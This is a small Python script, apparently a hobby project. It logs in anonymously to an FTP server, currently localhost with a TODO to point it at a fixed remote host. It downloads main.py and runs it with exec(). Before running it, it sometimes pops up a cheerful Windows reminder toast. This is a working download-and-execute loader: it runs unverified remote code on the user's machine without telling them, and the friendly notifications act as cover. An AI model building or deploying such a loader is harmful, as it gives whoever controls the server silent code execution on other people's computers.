from ftplib import FTP
from datetime import datetime
import time
from win10toast import ToastNotifier
from random import *

# The time to wait in seconds before executing the script
WAIT_TIME = 2

# The list of potentially useful things to tell the user
# TODO: Expand the list with more things
USER_TELL_STRINGS = [
    'Don\'t forget to drink Water.',
    'Never gonna give you up...',
    'The first bug was a literal bug that crawled into a computer system.'
]


# Connect to the FTP server
def ftp_connect():
    print('Connecting to server...')
    ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
    # ftp.set_debuglevel(1)
    ftp.login()
    print(ftp.getwelcome())
    print(ftp.dir())
    return ftp


# Download the new file from the FTP server
def ftp_download(ftp):
    print('Downloading...')
    # Create the unique name under which the new file is to be stored
    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
    print(filename)
    # Download the file and store it
    with open(f'{filename}.py', 'wb') as fp:
        print(ftp.retrbinary(f'RETR main.py', fp.write))
    return filename


# Say something potentially useful to the user
def tell_user():
    # Only with a chance of 20%, the code gets executed
    if randint(1, 100) >= 80:
        print('Saying something to the user')
        # Select a random string from the list
        notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
        print(notification_text)
        # Initialize the notification
        notification = ToastNotifier()
        # Create the notification and set its timeout
        notification.show_toast('Attention please', notification_text, duration=3)


# Execute the previously downloaded file
def execute_file(filename):
    print('Opening and executing file')
    exec(open(f'{filename}.py').read())


if __name__ == '__main__':
    print(f'Entering wait duration of {WAIT_TIME} seconds...')
    time.sleep(WAIT_TIME)

    connection = ftp_connect()
    name = ftp_download(connection)
    connection.close()
    tell_user()
    execute_file(name)
